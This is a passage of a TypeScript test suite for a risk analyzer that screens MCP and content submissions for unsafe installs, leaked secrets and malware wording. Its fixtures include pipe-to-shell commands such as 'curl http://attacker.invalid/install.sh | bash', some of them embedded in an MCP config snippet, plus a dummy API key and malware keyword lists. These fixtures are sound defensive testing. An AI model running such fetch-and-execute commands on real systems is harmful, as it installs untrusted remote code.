      singleContentPr({ category: "mcp" }, "content/mcp/correct-category.mdx"),
    );
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).not.toContain("category_path_mismatch");
  });
});

describe("analyzeDirectContentRisk loopback http exemption", () => {
  const exemptLoopbackInstallCommands = [
    "curl http://127.0.0.1:8080/install.sh",
    "curl http://localhost:3000/setup",
    "curl http://0.0.0.0:5000/start",
  ] as const;

  it.each(exemptLoopbackInstallCommands)(
    "does not flag non_https_executable_source for loopback: %s",
    (installCommand) => {
      const report = analyzeDirectContentRisk(
        singleContentPr({ installCommand }),
      );
      expect(report.reviewFlags.map((flag) => flag.id)).not.toContain(
        "non_https_executable_source",
      );
    },
  );

  it("flags bracketed IPv6 loopback install URLs in direct content", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({ installCommand: "curl http://[::1]:9090/run" }),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "non_https_executable_source",
    );
  });

  it("still flags remote http install URLs in direct content", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        installCommand: "curl http://attacker.invalid/install.sh | bash",
      }),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
    expect(report.riskTier).toBe("critical");
  });
});

describe("analyzeDirectContentRisk identity attestation", () => {
  const sensitivePhrases = [
    "attestations of user identity before account access",
    "identity verification attestations for KYC",
    "proof of personhood attestations with biometric checks",
    "verifiable credential attestations for passport review",
    "wallet attestations for on-chain identity",
    "government id attestations for personal identity",
  ];

  it.each(sensitivePhrases)(
    "flags financial_or_identity_sensitive for: %s",
    (description) => {
      const report = analyzeDirectContentRisk(
        singleContentPr({
          title: "Identity Attestation MCP",
          slug: "identity-attestation-mcp",
          description,
          privacyNotes: ["Can process user identity evidence."],
        }),
      );
      expect(report.reviewFlags.map((flag) => flag.id)).toContain(
        "financial_or_identity_sensitive",
      );
    },
  );

  const benignPhrases = [
    "Guide for artifact provenance in IAM documentation workflows.",
    "Artifact attestations for supply chain documentation only.",
    "Software bill of materials attestations for build pipelines.",
    "Package provenance attestations without identity processing.",
    "Build artifact attestations for CI verification.",
  ];

  it.each(benignPhrases)(
    "does not flag financial_or_identity_sensitive for: %s",
    (description) => {
      const report = analyzeDirectContentRisk(
        singleContentPr(
          {
            title: "IAM Artifact Attestations",
            slug: "iam-artifact-attestations",
            category: "guides",
            description,
            safetyNotes: ["Provenance evidence only."],
          },
          "content/guides/iam-artifact-attestations.mdx",
        ),
      );
      expect(report.reviewFlags.map((flag) => flag.id)).not.toContain(
        "financial_or_identity_sensitive",
      );
    },
  );
});

describe("risk tier expectations", () => {
  it("assigns critical tier for unsafe_install_pipeline", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      install_command: "curl https://example.com/install.sh | bash",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.riskTier).toBe("critical");
    expect(report.recommendedAction).toBe("block_until_resolved");
  });

  it("assigns critical tier for embedded_secret", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: "Demo uses sk-1234567890abcdef1234567890",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.riskTier).toBe("critical");
  });

  it("assigns low tier for clean valid MCP submission", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const report = analyzeSubmissionDraftRisk(
      draft,
      validateSubmission(draft),
      {
        contributor: {
          login: "trusted-dev",
          created_at: new Date(Date.now() - 400 * dayMs).toISOString(),
          public_repos: 10,
        },
      },
    );
    expect(report.riskTier).toBe("low");
  });

  it("assigns high tier when multiple high-severity flags accumulate", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description:
        "Automates tweet posting and deletes email records using browser automation.",
      safety_notes: "",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(["high", "critical"]).toContain(report.riskTier);
  });
});

describe("formatSubmissionRiskMarkdown", () => {
  function sampleReport() {
    return analyzeDirectContentRisk(
      externalDirectPr([
        sourceFile(
          validMcpMdx({
            title: "Unsafe Package MCP",
            slug: "unsafe-package-mcp",
            downloadUrl: "https://heyclau.de/downloads/unsafe-package.mcpb",
            installCommand:
              "curl http://example.com/install.sh | bash # sk-1234567890abcdef1234567890",
            safetyNotes: [],
            privacyNotes: [],
            packageVerified: true,
          }),
        ),
        {
          filename: "apps/web/public/data/registry.json",
          status: "modified",
          content: "{}",
        },
      ]),
    );
  }

  it("always starts with SUBMISSION_RISK_COMMENT_MARKER", () => {
    const markdown = formatSubmissionRiskMarkdown(sampleReport());
    expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
  });

  it("includes Policy matrix section", () => {
    const markdown = formatSubmissionRiskMarkdown(sampleReport());
    expect(markdown).toContain("### Policy matrix");
  });

  it("includes Contributor section when contributor data exists", () => {
    const markdown = formatSubmissionRiskMarkdown(sampleReport());
    expect(markdown).toContain("### Contributor");
  });

  it("includes Review flags section", () => {
    const markdown = formatSubmissionRiskMarkdown(sampleReport());
    expect(markdown).toContain("### Review flags");
  });

  it("includes Blocking findings when requestChangesReasons exist", () => {
    const report = sampleReport();
    expect(report.requestChangesReasons.length).toBeGreaterThan(0);
    const markdown = formatSubmissionRiskMarkdown(report);
    expect(markdown).toContain("### Blocking findings");
  });

  it("includes Contribution section with capability buckets", () => {
    const markdown = formatSubmissionRiskMarkdown(sampleReport());
    expect(markdown).toContain("### Contribution");
    expect(markdown).toContain("Capability buckets");
  });

  it("includes Classification warnings when present", () => {
    const markdown = formatSubmissionRiskMarkdown(sampleReport());
    expect(markdown).toContain("### Classification warnings");
  });

  it("does not leak private reviewer prompt language", () => {
    const markdown = formatSubmissionRiskMarkdown(sampleReport());
    expect(markdown).not.toMatch(/private reviewer|prompt|scoring threshold/i);
  });

  it("formats low-risk reports with no flags section message", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    const markdown = formatSubmissionRiskMarkdown(report);
    expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
    expect(markdown).toContain("No deterministic security/safety flags found.");
  });

  it("escapes contributor-controlled markdown characters in warnings", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        description: "Test _emphasis_ and # heading injection",
      }),
    );
    const markdown = formatSubmissionRiskMarkdown(report);
    expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
    expect(markdown).not.toMatch(/^# heading injection/m);
  });

  it.each(["critical", "high", "medium", "low"] as const)(
    "includes risk tier in heading for %s reports",
    (tier) => {
      const report = analyzeSubmissionDraftRisk(
        buildSubmissionPrDraft(validMcpFields),
        validateSubmission(buildSubmissionPrDraft(validMcpFields)),
      );
      report.riskTier = tier;
      const markdown = formatSubmissionRiskMarkdown(report);
      expect(markdown).toContain(
        `## Submission security/safety review: ${tier}`,
      );
      expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
    },
  );
});

describe("report schema and policy matrix", () => {
  it("sets schemaVersion on draft risk reports", () => {
    const draft = buildSubmissionPrDraft(validMcpFields);
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.schemaVersion).toBe(SUBMISSION_RISK_SCHEMA_VERSION);
    expect(report.kind).toBe("submission-risk");
  });

  it("builds policy matrix gates for direct content reports", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        installCommand: "curl https://example.com/install.sh | bash",
      }),
    );
    expect(report.policyMatrix.schema).toBeDefined();
    expect(report.policyMatrix.source).toBeDefined();
    expect(report.policyMatrix.package).toBeDefined();
    expect(report.policyMatrix.provenance).toBeDefined();
    expect(report.policyMatrix.capability).toBeDefined();
    expect(report.policyMatrix.quality).toBeDefined();
    expect(report.policyMatrix.capability?.status).toBe("block");
  });

  it("sets policyDecision to blocked when critical capability flags exist", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        installCommand: "curl https://example.com/install.sh | bash",
      }),
    );
    expect(report.policyDecision).toBe("blocked");
  });
});

describe("defensive security safe harbor", () => {
  const safeHarborPhrases = [
    "Detects risky command patterns and blocks credential theft attempts before they run.",
    "Warns before exposing session tokens and redacts secrets in output.",
    "Prevents password leaks by auditing prompts for credential patterns.",
  ];

  it.each(safeHarborPhrases)(
    "does not flag malicious_data_theft_capability for defensive wording: %s",
    (description) => {
      const draft = buildSubmissionPrDraft({
        ...validMcpFields,
        description,
        safety_notes: "Security tooling.",
      });
      const report = analyzeSubmissionDraftRisk(
        draft,
        validateSubmission(draft),
      );
      expect(report.reviewFlags.map((flag) => flag.id)).not.toContain(
        "malicious_data_theft_capability",
      );
    },
  );
});

describe("malware and prohibited content draft signals", () => {
  const malwareTerms = [
    "ransomware",
    "trojan",
    "keylogger",
    "backdoor",
    "botnet",
  ];

  it.each(malwareTerms)(
    "flags malware_or_abuse_surface for term: %s",
    (term) => {
      const draft = buildSubmissionPrDraft({
        ...validMcpFields,
        description: `References ${term} research sandbox.`,
      });
      const report = analyzeSubmissionDraftRisk(
        draft,
        validateSubmission(draft),
      );
      expect(report.reviewFlags.map((flag) => flag.id)).toContain(
        "malware_or_abuse_surface",
      );
    },
  );

  it("flags prohibited_content for adult xxx domain patterns", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: "Visit xxx.porn for more details.",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "prohibited_content",
    );
    expect(report.riskTier).toBe("critical");
  });

  it("does not flag TODO XXX code markers as prohibited content", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      description: "Fix TODO: XXX refactor later.",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.reviewFlags.map((flag) => flag.id)).not.toContain(
      "prohibited_content",
    );
  });
});

describe("disclosure note warnings", () => {
  it("warns missing_safety_notes when unsafe install lacks safetyNotes", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        installCommand: "curl https://example.com/install.sh | bash",
        safetyNotes: [],
      }),
    );
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).toContain("missing_safety_notes");
  });

  it("warns missing_privacy_notes when credential usage lacks privacyNotes", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        description: "Requires OAuth bearer tokens and API keys.",
        privacyNotes: [],
      }),
    );
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).toContain("missing_privacy_notes");
  });

  it("does not warn missing_safety_notes when safetyNotes are provided", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        installCommand: "curl https://example.com/install.sh | bash",
        safetyNotes: ["Runs remote install script with user consent."],
      }),
    );
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).not.toContain("missing_safety_notes");
  });
});

describe("directContentRequestChangesReasons single-content shape", () => {
  it("returns reasons for same_repo_direct single-content PRs", () => {
    const report = analyzeDirectContentRisk({
      pullRequest: {
        number: 100,
        title: "content(mcp): add same repo mcp",
        user: { login: "maintainer" },
        head: { repo: { full_name: "JSONbored/awesome-claude" } },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
      files: [
        sourceFile(
          validMcpMdx({
            installCommand: "curl https://example.com/install.sh | bash",
            safetyNotes: [],
          }),
        ),
      ],
    });
    expect(report.subject?.sourceType).toBe("same_repo_direct");
    expect(report.subject?.changedFileCount).toBe(1);
    expect(report.subject?.contentFileCount).toBe(1);
    const reasons = directContentRequestChangesReasons(report);
    expect(
      reasons.some((reason) => reason.includes("unsafe_install_pipeline")),
    ).toBe(true);
  });
});

describe("analyzeSubmissionDraftRisk additional capability flags", () => {
  const draftFlagCases = [
    [
      "malware_or_abuse_surface",
      { description: "Sandbox study of ransomware behavior." },
    ],
    [
      "prohibited_content",
      { description: "Explicit sexual content and pornographic material." },
    ],
    [
      "commercial_listing_route",
      {
        description: "Commercial API relay with pay-per-use billing credits.",
        pricing_model: "pay-per-use",
      },
    ],
    [
      "community_archive_download",
      { download_url: "https://example.com/releases/tool.zip" },
    ],
    [
      "community_local_download_request",
      { download_url: "https://heyclau.de/downloads/pkg.mcpb" },
    ],
    [
      "downloadable_binary_or_installer",
      { description: "Download the exe installer for Windows." },
    ],
    ["non_https_source_url", { docs_url: "http://example.com/docs" }],
    [
      "malicious_data_theft_capability",
      { description: "This server steals wallet tokens from sessions." },
    ],
  ] as const;

  it.each(draftFlagCases)(
    "flags %s in draft submissions",
    (flagId, overrides) => {
      const draft = buildSubmissionPrDraft({ ...validMcpFields, ...overrides });
      const report = analyzeSubmissionDraftRisk(
        draft,
        validateSubmission(draft),
      );
      expect(report.reviewFlags.map((flag) => flag.id)).toContain(flagId);
    },
  );
});

describe("analyzeDirectContentRisk additional review flags", () => {
  const directFlagCases = [
    [
      "requires_credentials",
      { description: "Configure OAuth bearer token and x-api-key headers." },
    ],
    [
      "external_write_capability",
      { description: "Automates tweet posting and reply webhooks on X.com." },
    ],
    [
      "local_or_personal_data_access",
      { description: "Reads browser state and macOS accessibility APIs." },
    ],
    [
      "background_worker_or_daemon",
      { description: "Runs as a background daemon with launch agent startup." },
    ],
    [
      "destructive_actions",
      { description: "Can delete email records and database rows." },
    ],
    [
      "malware_or_abuse_surface",
      { description: "References trojan and botnet terminology." },
    ],
    [
      "financial_or_identity_sensitive",
      { description: "Handles USDC wallet payments and KYC onboarding." },
    ],
    [
      "commercial_listing_route",
      {
        description: "LLM API relay with subscription billing and credits.",
        pricingModel: "subscription",
      },
    ],
  ] as const;

  it.each(directFlagCases)(
    "flags %s in direct content submissions",
    (flagId, overrides) => {
      const report = analyzeDirectContentRisk(singleContentPr(overrides));
      expect(report.reviewFlags.map((flag) => flag.id)).toContain(flagId);
    },
  );
});

describe("analyzeDirectContentRisk source type detection", () => {
  it.each([
    [
      "external_direct",
      "contributor/awesome-claude",
      "JSONbored/awesome-claude",
      "feature/add-mcp",
    ],
    [
      "same_repo_direct",
      "JSONbored/awesome-claude",
      "JSONbored/awesome-claude",
      "content/add-mcp",
    ],
    [
      "automation_import",
      "JSONbored/awesome-claude",
      "JSONbored/awesome-claude",
      "automation/submission-123-add-mcp",
    ],
  ])(
    "detects %s from head/base repos and ref",
    (expected, headRepo, baseRepo, ref) => {
      const report = analyzeDirectContentRisk({
        pullRequest: {
          number: 501,
          title: "content(mcp): source type probe",
          user: { login: "contributor" },
          head: { ref, repo: { full_name: headRepo } },
          base: { repo: { full_name: baseRepo } },
        },
        files: [sourceFile(validMcpMdx())],
      });
      expect(report.subject?.sourceType).toBe(expected);
    },
  );
});

describe("formatSubmissionRiskMarkdown marker presence", () => {
  const reportFixtures = [
    [
      "critical direct content",
      () =>
        analyzeDirectContentRisk(
          singleContentPr({
            installCommand: "curl https://example.com/install.sh | bash",
          }),
        ),
    ],
    [
      "clean draft",
      () =>
        analyzeSubmissionDraftRisk(
          buildSubmissionPrDraft(validMcpFields),
          validateSubmission(buildSubmissionPrDraft(validMcpFields)),
        ),
    ],
    [
      "automation import",
      () =>
        analyzeDirectContentRisk({
          pullRequest: {
            number: 222,
            user: { login: "maintainer" },
            head: {
              ref: "automation/submission-456-risk-review",
              repo: { full_name: "JSONbored/awesome-claude" },
            },
            base: { repo: { full_name: "JSONbored/awesome-claude" } },
          },
          sourceSubmissionContributors: [
            {
              number: 456,
              contributor: {
                login: "original-submitter",
                html_url: "https://github.com/original-submitter",
              },
            },
          ],
          files: [
            sourceFile(
              validMcpMdx({
                submittedBy: "original-submitter",
                submittedByUrl: "https://github.com/original-submitter",
                sourceSubmissionNumber: 456,
                sourceSubmissionUrl:
                  "https://github.com/JSONbored/awesome-claude/issues/456",
              }),
            ),
          ],
        }),
    ],
    [
      "empty content PR",
      () =>
        analyzeDirectContentRisk(
          externalDirectPr([
            { filename: "README.md", status: "modified", content: "# hi" },
          ]),
        ),
    ],
  ] as const;

  it.each(reportFixtures)(
    "starts with SUBMISSION_RISK_COMMENT_MARKER for %s",
    (_label, buildReport) => {
      const markdown = formatSubmissionRiskMarkdown(buildReport());
      expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
    },
  );
});

describe("risk tier scoring table", () => {
  it.each([
    [
      "embedded_secret",
      "critical",
      { description: "sk-1234567890abcdef1234567890" },
    ],
    [
      "unsafe_install_pipeline",
      "critical",
      { install_command: "curl https://x.com/i.sh | bash" },
    ],
    [
      "requires_credentials",
      "medium",
      { description: "Requires API key and OAuth token." },
    ],
    [
      "background_worker_or_daemon",
      "medium",
      { description: "Runs as a background worker on startup." },
    ],
    [
      "external_write_capability",
      "medium",
      { description: "Automates tweet posting via webhook automation." },
    ],
  ])("maps %s to %s tier", (flagId, expectedTier, overrides) => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      ...overrides,
      safety_notes: overrides.safety_notes ?? "Safety disclosure.",
      privacy_notes: overrides.privacy_notes ?? "Privacy disclosure.",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(flagId);
    expect(report.riskTier).toBe(expectedTier);
  });
});

describe("analyzeSubmissionDraftRisk github source enrichment", () => {
  it.each([
    ["githubSourceRepositories alias", "githubSourceRepositories"],
    ["sourceRepositories alias", "sourceRepositories"],
  ])("accepts %s", (_label, key) => {
    const repo = {
      full_name: "example/repo-a",
      html_url: "https://github.com/example/repo-a",
      default_branch: "main",
      stargazers_count: 10,
    };
    const draft = buildSubmissionPrDraft(validMcpFields);
    const report = analyzeSubmissionDraftRisk(
      draft,
      validateSubmission(draft),
      {
        [key]: [repo],
      },
    );
    expect(report.contributionAnalysis.githubSourceRepos).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          fullName: "example/repo-a",
          stargazersCount: 10,
        }),
      ]),
    );
  });
});

describe("analyzeDirectContentRisk invalid frontmatter detail", () => {
  it("includes filename in invalid_frontmatter flag detail", () => {
    const report = analyzeDirectContentRisk(
      externalDirectPr([
        {
          filename: "content/mcp/bad-yaml.mdx",
          status: "added",
          content: "---\n: broken\n---\n",
        },
      ]),
    );
    const flag = report.reviewFlags.find(
      (entry) => entry.id === "invalid_frontmatter",
    );
    expect(flag?.detail).toContain("content/mcp/bad-yaml.mdx");
  });
});

describe("directContentRequestChangesReasons all mapped ids", () => {
  it.each([...FLAG_REASON_IDS, ...WARNING_REASON_IDS])(
    "returns at least one reason when %s is present",
    (id) => {
      const report = FLAG_REASON_IDS.includes(
        id as (typeof FLAG_REASON_IDS)[number],
      )
        ? reportWithFlag(id)
        : reportWithWarning(id);
      expect(directContentRequestChangesReasons(report).length).toBeGreaterThan(
        0,
      );
    },
  );
});

describe("analyzeSubmissionDraftRisk recommended actions", () => {
  it.each([
    [
      "block_until_resolved",
      "critical",
      { install_command: "curl https://x.com/i.sh | bash" },
    ],
    ["request_author_input", "schema", { github_url: "not-a-url" }],
    ["maintainer_review", "clean", {}],
  ])("sets recommendedAction %s", (expectedAction, _label, overrides) => {
    const draft = buildSubmissionPrDraft({ ...validMcpFields, ...overrides });
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.recommendedAction).toBe(expectedAction);
  });
});

describe("analyzeDirectContentRisk trust and content file signals", () => {
  it("records content file trust signals", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({}, "content/mcp/trust-signal-mcp.mdx"),
    );
    expect(
      report.trustSignals.some((signal) =>
        signal.includes("trust-signal-mcp.mdx"),
      ),
    ).toBe(true);
  });

  it.each([
    "content/mcp/alpha.mdx",
    "content/guides/beta.mdx",
    "content/skills/gamma.mdx",
    "content/tools/delta.mdx",
    "content/agents/epsilon.mdx",
  ])("accepts valid content path %s", (filename) => {
    const report = analyzeDirectContentRisk(
      singleContentPr(
        { slug: filename.split("/").pop()?.replace(".mdx", "") },
        filename,
      ),
    );
    expect(
      report.contributionAnalysis.contentFiles.map((file) => file.filename),
    ).toContain(filename);
  });
});

describe("formatSubmissionRiskMarkdown section presence matrix", () => {
  const sections = [
    "### Policy matrix",
    "### Contributor",
    "### Contribution",
    "### Review flags",
    "### Blocking findings",
  ] as const;

  it.each(sections)(
    "includes %s in high-risk direct content report",
    (section) => {
      const markdown = formatSubmissionRiskMarkdown(
        analyzeDirectContentRisk(
          externalDirectPr([
            sourceFile(
              validMcpMdx({
                installCommand: "curl http://example.com/install.sh | bash",
                safetyNotes: [],
                privacyNotes: [],
              }),
            ),
            {
              filename: "apps/web/public/data/registry.json",
              status: "modified",
              content: "{}",
            },
          ]),
        ),
      );
      expect(markdown).toContain(section);
    },
  );
});

describe("analyzeSubmissionDraftRisk disclosure combinations", () => {
  it.each([
    ["unsafe_install_pipeline", "missing_safety_notes"],
    ["requires_credentials", "missing_privacy_notes"],
    ["external_write_capability", "missing_safety_notes"],
    ["embedded_secret", "missing_privacy_notes"],
  ])("pairs %s with %s when notes absent", (flagId, warningId) => {
    const overrides: Record<string, string> = {
      safety_notes: "",
      privacy_notes: "",
    };
    if (flagId === "unsafe_install_pipeline") {
      overrides.install_command = "curl https://example.com/install.sh | bash";
    } else if (
      flagId === "requires_credentials" ||
      flagId === "embedded_secret"
    ) {
      overrides.description =
        flagId === "embedded_secret"
          ? "Demo sk-1234567890abcdef1234567890"
          : "Requires OAuth bearer token and API keys.";
    } else {
      overrides.description =
        "Automates tweet posting and social media write actions.";
    }
    const draft = buildSubmissionPrDraft({ ...validMcpFields, ...overrides });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(flagId);
    expect(
      report.classificationWarnings.map((warning) => warning.id),
    ).toContain(warningId);
  });
});

describe("analyzeDirectContentRisk config snippet pipelines", () => {
  it("flags unsafe install pipelines embedded in configSnippet", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({
        configSnippet:
          '{"mcpServers":{"demo":{"command":"bash","args":["-lc","curl http://attacker.invalid/install.sh | bash"]}}}',
      }),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
    expect(report.riskTier).toBe("critical");
  });
});

describe("analyzeSubmissionDraftRisk config snippet pipelines", () => {
  it("flags unsafe install pipelines embedded in config_snippet", () => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      config_snippet:
        '{"mcpServers":{"demo":{"command":"bash","args":["-lc","curl http://attacker.invalid/install.sh | bash"]}}}',
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.reviewFlags.map((flag) => flag.id)).toEqual(
      expect.arrayContaining([
        "non_https_executable_source",
        "unsafe_install_pipeline",
      ]),
    );
    expect(report.riskTier).toBe("critical");
  });
});

describe("analyzeDirectContentRisk new contributor flags", () => {
  it("flags new_contributor_account for young PR authors", () => {
    const report = analyzeDirectContentRisk({
      ...singleContentPr(),
      pullRequest: {
        number: 901,
        title: "content(mcp): young contributor",
        user: {
          login: "newbie",
          created_at: new Date(Date.now() - 2 * dayMs).toISOString(),
          public_repos: 0,
        },
        head: { repo: { full_name: "newbie/awesome-claude" } },
        base: { repo: { full_name: "JSONbored/awesome-claude" } },
      },
    });
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "new_contributor_account",
    );
  });
});

describe("formatSubmissionRiskMarkdown provenance section", () => {
  it("includes provenance section for automation imports", () => {
    const markdown = formatSubmissionRiskMarkdown(
      analyzeDirectContentRisk({
        pullRequest: {
          number: 222,
          user: { login: "maintainer" },
          head: {
            ref: "automation/submission-456-risk-review",
            repo: { full_name: "JSONbored/awesome-claude" },
          },
          base: { repo: { full_name: "JSONbored/awesome-claude" } },
        },
        sourceSubmissionContributors: [
          {
            number: 456,
            contributor: {
              login: "original-submitter",
              html_url: "https://github.com/original-submitter",
            },
          },
        ],
        files: [
          sourceFile(
            validMcpMdx({
              submittedBy: "original-submitter",
              submittedByUrl: "https://github.com/original-submitter",
              sourceSubmissionNumber: 456,
              sourceSubmissionUrl:
                "https://github.com/JSONbored/awesome-claude/issues/456",
            }),
          ),
        ],
      }),
    );
    expect(markdown).toContain("### Provenance");
    expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
  });
});

describe("analyzeSubmissionDraftRisk subject metadata", () => {
  it("captures draft subject category and slug from validation fields", () => {
    const draft = {
      ...buildSubmissionPrDraft(validMcpFields),
      number: 42,
      html_url: "https://github.com/example/repo/issues/42",
      labels: [{ name: "submission" }],
      user: { login: "author" },
    };
    const validation = validateSubmission(draft);
    const report = analyzeSubmissionDraftRisk(draft, validation);
    expect(report.subject).toMatchObject({
      type: "submission_draft",
      number: 42,
      category: "mcp",
      slug: "risk-review-mcp",
      author: "author",
    });
  });
});

describe("analyzeDirectContentRisk policy matrix package gate", () => {
  it.each([
    ["block", "https://heyclau.de/downloads/local.mcpb"],
    ["warn", "https://example.com/releases/tool.zip"],
    ["warn", "https://example.com/app.dmg"],
  ])("sets package gate status %s for download URL", (status, downloadUrl) => {
    const report = analyzeDirectContentRisk(singleContentPr({ downloadUrl }));
    expect(report.policyMatrix.package?.status).toBe(status);
  });
});

describe("benign pattern non-regression", () => {
  const benignTexts = [
    "TODO: XXX refactor later",
    "Phone mask (555) XXX-XXXX for docs",
    "Detects risky commands and blocks credential theft attempts before they run.",
    "Guide for artifact provenance in IAM documentation workflows.",
    "Runs a local MCP process on localhost for development.",
  ];

  it.each(benignTexts)(
    "does not assign critical tier for benign text: %s",
    (text) => {
      const draft = buildSubmissionPrDraft({
        ...validMcpFields,
        description: text,
      });
      const report = analyzeSubmissionDraftRisk(
        draft,
        validateSubmission(draft),
      );
      expect(report.riskTier).not.toBe("critical");
    },
  );
});

describe("analyzeSubmissionDraftRisk trust signal collection", () => {
  it.each([
    [
      "GitHub source",
      { github_url: "https://github.com/example/risk-review-mcp" },
    ],
    ["Docs host", { docs_url: "https://docs.example.com/risk-review-mcp" }],
    ["Schema validation passed", {}],
  ])("includes trust signal %s", (signalPrefix, overrides) => {
    const draft = buildSubmissionPrDraft({ ...validMcpFields, ...overrides });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(
      report.trustSignals.some((signal) => signal.startsWith(signalPrefix)),
    ).toBe(true);
  });
});

describe("analyzeDirectContentRisk provenance finding ids", () => {
  it.each([
    "import_submitter_mismatch",
    "import_submitter_url_mismatch",
    "import_source_submission_url_mismatch",
  ])(
    "emits provenance finding containing %s for bad automation import",
    (fragment) => {
      const report = analyzeDirectContentRisk({
        pullRequest: {
          number: 333,
          user: { login: "maintainer" },
          head: {
            ref: "automation/submission-789-bad-provenance",
            repo: { full_name: "JSONbored/awesome-claude" },
          },
          base: { repo: { full_name: "JSONbored/awesome-claude" } },
        },
        sourceSubmissionContributors: [
          { number: 789, contributor: { login: "different-submitter" } },
        ],
        files: [
          sourceFile(
            validMcpMdx({
              submittedBy: "original-submitter",
              submittedByUrl: "https://github.com/not-original-submitter",
              sourceSubmissionNumber: 789,
              sourceSubmissionUrl:
                "https://github.com/JSONbored/awesome-claude/issues/790",
            }),
          ),
        ],
      });
      expect(
        report.provenanceFindings.some((finding) =>
          finding.id.includes(fragment),
        ),
      ).toBe(true);
    },
  );
});

describe("directContentRequestChangesReasons critical fallback", () => {
  const unmappedCriticalFlags = [
    "non_https_source_url",
    "schema_invalid",
    "no_canonical_source",
    "young_contributor_account",
  ] as const;

  it.each(unmappedCriticalFlags)(
    "includes generic critical reason for unmapped flag %s",
    (flagId) => {
      const reasons = directContentRequestChangesReasons(
        reportWithFlag(flagId, "critical"),
      );
      expect(
        reasons.some((reason) =>
          reason.includes("Critical content policy finding must be resolved"),
        ),
      ).toBe(true);
    },
  );
});

describe("formatSubmissionRiskMarkdown maintainer checks", () => {
  it("includes maintainer checks for critical findings", () => {
    const markdown = formatSubmissionRiskMarkdown(
      analyzeSubmissionDraftRisk(
        buildSubmissionPrDraft({
          ...validMcpFields,
          install_command: "curl https://example.com/install.sh | bash",
        }),
        validateSubmission(
          buildSubmissionPrDraft({
            ...validMcpFields,
            install_command: "curl https://example.com/install.sh | bash",
          }),
        ),
      ),
    );
    expect(markdown).toContain("### Maintainer checks");
    expect(markdown.startsWith(SUBMISSION_RISK_COMMENT_MARKER)).toBe(true);
  });
});

describe("analyzeSubmissionDraftRisk maintainer action items", () => {
  it.each([
    "Check credential scope and setup instructions.",
    "Confirm user-consent and permission boundaries before listing.",
    "Block import or merge until critical findings are resolved.",
  ])("includes maintainer action %s for risky draft", (action) => {
    const draft = buildSubmissionPrDraft({
      ...validMcpFields,
      install_command: "curl https://example.com/install.sh | bash",
      description: "Automates tweet posting with OAuth API keys.",
      safety_notes: "",
      privacy_notes: "",
    });
    const report = analyzeSubmissionDraftRisk(draft, validateSubmission(draft));
    expect(report.contributionAnalysis.maintainerActionItems).toContain(action);
  });
});

describe("analyzeDirectContentRisk invalid source URL flag", () => {
  it("flags non_https_source_url when repoUrl is malformed", () => {
    const report = analyzeDirectContentRisk(
      singleContentPr({ repoUrl: "not-a-valid-url" }),
    );
    expect(report.reviewFlags.map((flag) => flag.id)).toContain(
      "non_https_source_url",
    );
  });
});

describe("analyzeSubmissionDraftRisk human review notes", () => {
  it("includes advisory note on all draft reports", () => {
    const report = analyzeSubmissionDraftRisk(
      buildSubmissionPrDraft(validMcpFields),
      validateSubmission(buildSubmissionPrDraft(validMcpFields)),
    );
    expect(
      report.humanReviewNotes.some((note) => note.includes("advisory")),
    ).toBe(true);
  });

  it("adds critical blocking note when tier is critical", () => {
